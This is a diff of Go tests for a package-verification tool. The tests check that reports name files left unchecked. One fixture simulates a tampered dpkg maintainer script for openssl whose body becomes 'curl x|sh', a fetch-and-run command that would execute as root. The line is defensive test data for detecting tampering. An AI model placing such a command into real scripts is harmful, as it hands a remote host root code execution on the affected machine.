@@ -709,6 +709,21 @@ func TestJudgeNoRefLimitOnlyWhenFilesWentUnchecked(t *testing.T) {
 	if r := run(clean(), nil, nothing()); !noRef(r) {
 		t.Errorf("no snapshot and no source used, and the gap is not stated: %q", r.CouldNotRuleOut)
 	}
+	// Nothing changed, but verification ran into a problem and used no
+	// source: what it had to check went unchecked.
+	errsOnly := &pkgverify.Result{Mode: pkgverify.ModeArchive, Errors: []string{"open the package cache: permission denied"}}
+	if r := run(clean(), snapOf(clean()), errsOnly); !noRef(r) {
+		t.Errorf("verification failed with no source used, and the gap is not stated: %q", r.CouldNotRuleOut)
+	}
+	// Only a dpkg maintainer script changed (no package lists it, but it
+	// runs as root): verification had it to check.
+	before := clean()
+	before.Files = append(before.Files, file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\nexit 0", 0o755))
+	after := clone(before)
+	setFile(after, file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\ncurl x|sh", 0o755))
+	if r := run(after, snapOf(before), nothing()); !noRef(r) {
+		t.Errorf("a changed maintainer script went unchecked and the gap is not stated: %q", r.CouldNotRuleOut)
+	}
 }
 
 func itoa(n int) string {
@@ -768,7 +783,7 @@ func TestJudgeConffilesExplainedQuietly(t *testing.T) {
 
 func TestJudgeIndexSignatureErrors(t *testing.T) {
 	bad := "BAD SIGNATURE: https://deb.debian.org/debian/dists/bookworm/InRelease: no valid signature (the index was tampered with or intercepted, or telltale's built-in keys are out of date; nothing that depends on it was verified)"
-	other := "could not download 2 package(s); first error: timeout"
+	other := "could not download 2 packages; first error: timeout"
 	res := archive()
 	res.Errors = []string{bad, other}
 	r := run(clean(), nil, res)
